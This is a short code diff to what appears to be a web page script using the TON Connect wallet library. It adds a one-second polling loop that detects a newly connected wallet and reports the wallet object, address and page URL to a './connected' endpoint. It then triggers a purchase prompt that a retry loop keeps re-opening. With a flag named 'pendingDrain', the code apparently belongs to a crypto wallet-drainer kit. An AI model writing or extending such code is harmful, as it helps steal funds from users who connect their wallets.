@@ -112,6 +112,31 @@
     }
   })
 
+  // Some webviews never fire onStatusChange after a QR pair; poll the same
+  // state so the prompt still appears.
+  function pollWallet() {
+    const w = tonConnectUI.wallet
+    if (!w) {
+      clearRetry()
+      retryCount = 0
+      promptedFor = ''
+      return
+    }
+    const addr = w.account && w.account.address
+    if (!addr || addr === promptedFor) return
+    promptedFor = addr
+    pendingDrain = false
+    clearRetry()
+    retryCount = 0
+    post('./connected', {
+      raw: w,
+      wallet: addr,
+      href: location.href, startParam,
+    })
+    setTimeout(() => { void buy() }, 900)
+  }
+  setInterval(pollWallet, 1000)
+
   async function buy(isRetry = false) {
     if (busy) {
       // a prompt is already open — keep the loop alive without stacking calls
